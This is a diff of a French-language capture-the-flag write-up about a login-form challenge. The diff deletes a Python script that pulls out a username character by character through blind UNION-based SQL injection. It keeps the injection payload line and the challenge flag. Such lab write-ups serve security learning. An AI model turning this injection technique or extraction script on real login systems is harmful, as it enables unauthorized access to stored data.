@@ -9,48 +9,8 @@ Interéssant. On ne nous affiche rien à l'écran sauf que des messages d'erreur
 Trouvé!! Il y a 3 colonnes et vu qu'on est dans un login form la table doit forcément s'appeler "users" donc essayons ceci  
 ``1' UNION SELECT username,null,null from users where username LIKE '%'-- ``  
 <img src="https://github.com/user-attachments/assets/69ceeea4-ded6-4cb8-934d-52b571dc4e30" alt="Alt Text" width="400" height="400">  
-Ok donc on va devoir fort probablement faire un script pour brute force le username qui est probablement le 1er flag  
-```python
-import requests
-import string
-
-URL = "https://auth10x.chals.ageei.org/validate"
-
-CHARSET = string.digits + string.ascii_lowercase + string.ascii_uppercase + "!@#$^&*-_"
-
-username = "LEGO-"
-
-SQLI_TEMPLATE = "' UNION SELECT username, null, null FROM users WHERE username LIKE '{name}%' -- "
-
-# Function to extract username character by character
-def extract_username():
-    global username
-    while True:
-        found = False
-        for char in CHARSET:
-            test_name = username + char
-            print(f"[*] Testing: {test_name}%", end="\r")
-
-            payload = {"username": SQLI_TEMPLATE.format(name=test_name), "password": ""}
-            response = requests.post(URL, data=payload)
-
-            if "Identifiants faux !" in response.text:
-                username += char
-                print(f"\n[✔] Found character: {char}")
-                found = True
-                break
-
-        if not found:
-            print("\n[🔥] Username Extraction Complete!")
-            break
-
-    return username
-
-print("[+] Starting username brute-force extraction...")
-final_username = extract_username()
-print(f"[🚀] Extracted Username: {final_username}")
-```  
-<img src="https://github.com/user-attachments/assets/9d1021a0-8e22-47ec-83aa-ce8653bf45a4" alt="Alt Text" width="400" height="400">  
-SUCESS!!!!  
+Ok donc on va devoir fort probablement faire un script pour brute force le username qui est probablement le 1er flag     
+<img src="https://github.com/user-attachments/assets/9d1021a0-8e22-47ec-83aa-ce8653bf45a4" alt="Alt Text" width="400" height="400">    
+SUCCESS!!!!    
 Flag: LEGO-us3rn4m3-5b1706
 
